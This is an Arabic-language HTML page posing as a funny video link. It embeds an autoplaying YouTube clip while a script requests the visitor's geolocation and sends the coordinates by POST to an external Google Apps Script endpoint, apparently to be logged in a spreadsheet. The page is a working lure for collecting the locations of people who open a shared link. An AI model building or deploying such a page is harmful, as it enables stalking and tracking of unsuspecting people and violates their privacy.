
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>🤣 شوف الفيديو ده</title>
  <style>
    body {
      margin: 0;
      background: black;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      position: relative;
      color: white;
      font-family: Arial, sans-serif;
    }
    iframe {
      width: 100%;
      height: 100%;
      border: none;
    }
    #location-info {
      position: absolute;
      bottom: 10px;
      right: 10px;
      background-color: rgba(0,0,0,0.7);
      padding: 10px;
      border-radius: 8px;
      font-size: 14px;
    }
  </style>
</head>
<body>

  <iframe src="https://www.youtube.com/embed/9A6OAWmtkWY?autoplay=1&rel=0&showinfo=0"
          allowfullscreen allow="autoplay; encrypted-media"></iframe>

  <div id="location-info">📍 جاري تحديد موقع الزائر...</div>

  <script>
    const locationDiv = document.getElementById("location-info");

    navigator.geolocation.getCurrentPosition(function(position) {
      const lat = position.coords.latitude;
      const lng = position.coords.longitude;

      // عرض الموقع على الشاشة
      locationDiv.innerHTML = `📍 موقع الزائر: ${lat.toFixed(5)}, ${lng.toFixed(5)} <br>📤 يتم إرسال الموقع...`;

      // إرسال الموقع إلى Google Sheets
      fetch("https://script.google.com/macros/s/AKfycbzL5Nys6NIEa27q5QPkcf0mMJ3U6YRr_ZBF1T7H3BLMBhI46VsbaS5xlv5DxYi2eCszcA/exec", {
        method: "POST",
        mode: "no-cors",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          latitude: lat,
          longitude: lng
        })
      });

      locationDiv.innerHTML += "<br>✅ تم إرسال الموقع بنجاح.";
    }, function(error) {
      locationDiv.innerHTML = "❌ لم نتمكن من الحصول على موقعك.";
      console.error("Location error:", error);
    });
  </script>

</body>
</html>
